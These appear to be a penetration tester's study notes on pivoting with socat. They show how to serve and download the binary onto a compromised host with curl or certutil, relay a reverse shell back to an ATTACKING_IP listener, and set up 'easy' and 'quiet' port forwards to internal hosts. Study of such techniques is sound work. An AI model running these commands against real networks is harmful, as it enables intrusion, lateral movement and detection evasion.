On Kali (inside the directory containing your Socat binary):

```bash - kali
sudo python3 -m http.server 80
```

Then, on the target:  
```bash - kali
curl $KALI/socat -o /tmp/socat-USERNAME && chmod +x /tmp/socat-USERNAME
```
OR
```command prompt - target
certutil -urlcache -split -f http://192.168.111.133/socatx64.exe
```


standard netcat listener on our attacking box 

![[rlwrap]]

Next, on the compromised server, use the following command to start the relay:  

```bash - target
./socat tcp-l:8000 tcp:ATTACKING_IP:443 &
```

_**Note:** the order of the two addresses matters here. Make sure to open the listening port first,_ then _connect back to the attacking machine._

From here we can then create a reverse shell to the newly opened port 8000 on the compromised server. This is demonstrated in the following screenshot, using netcat on the remote server to simulate receiving a reverse shell from the target server:

![[Pasted image 20220116094947.png]]

A brief explanation of the above command:

-   `tcp-l:8000` is used to create the first half of the connection -- an IPv4 listener on tcp port 8000 of the target machine.
-   `tcp:ATTACKING_IP:443` connects back to our local IP on port 443. The ATTACKING_IP obviously needs to be filled in correctly for this to work.
-   `&` backgrounds the listener, turning it into a job so that we can still use the shell to execute other commands.

The relay connects back to a listener started using an alias to a standard netcat listener: `sudo rlwrap -cAr nc -lvnp 443`.


**Port Forwarding -- Easy**

The quick and easy way to set up a port forward with socat is quite simply to open up a listening port on the compromised server, and redirect whatever comes into it to the target server. For example, if the compromised server is 172.16.0.5 and the target is port 3306 of 172.16.0.10, we could use the following command (on the compromised server) to create a port forward:  
```bash - target
./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &  
```

This opens up port 33060 on the compromised server and redirects the input from the attacking machine straight to the intended target server, essentially giving us access to the (presumably MySQL Database) running on our target of 172.16.0.10. The `fork` option is used to put every connection into a new process, and the `reuseaddr` option means that the port stays open after a connection is made to it. Combined, they allow us to use the same port forward for more than one connection. Once again we use `&` to background the shell, allowing us to keep using the same terminal session on the compromised server for other things.

We can now connect to port 33060 on the relay (172.16.0.5) and have our connection directly relayed to our intended target of 172.16.0.10:3306.


**Port Forwarding -- Quiet**

The previous technique is quick and easy, but it also opens up a port on the compromised server, which could potentially be spotted by any kind of host or network scanning. Whilst the risk is not _massive_, it pays to know a slightly quieter method of port forwarding with socat. This method is marginally more complex, but doesn't require opening up a port externally on the compromised server.

First of all, on our own attacking machine, we issue the following command:  
`socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &`

This opens up two ports: 8000 and 8001, creating a local port relay. What goes into one of them will come out of the other. For this reason, port 8000 also has the `fork` and `reuseaddr` options set, to allow us to create more than one connection using this port forward.

Next, on the compromised relay server (172.16.0.5 in the previous example) we execute this command:  
`./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &  
`

This makes a connection between our listening port 8001 on the attacking machine, and the open port of the target server. To use the fictional network from before, we could enter this command as:  
`./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &  
`

This would create a link between port 8000 on our attacking machine, and port 80 on the intended target (172.16.0.10), meaning that we could go to `localhost:8000` in our attacking machine's web browser to load the webpage served by the target: 172.16.0.10:80!

This is quite a complex scenario to visualise, so let's quickly run through what happens when you try to access the webpage in your browser:

-   The request goes to `127.0.0.1:8000`
-   Due to the socat listener we started on our own machine, anything that goes into port 8000, comes out of port 8001
-   Port 8001 is connected directly to the socat process we ran on the compromised server, meaning that anything coming out of port 8001 gets sent to the compromised server, where it gets relayed to port 80 on the target server.

The process is then reversed when the target sends the response:

-   The response is sent to the socat process on the compromised server. What goes into the process comes out at the other side, which happens to link straight to port 8001 on our attacking machine.
-   Anything that goes into port 8001 on our attacking machine comes out of port 8000 on our attacking machine, which is where the web browser expects to receive its response, thus the page is received and rendered.

We have now achieved the same thing as previously, but without opening any ports on the server!
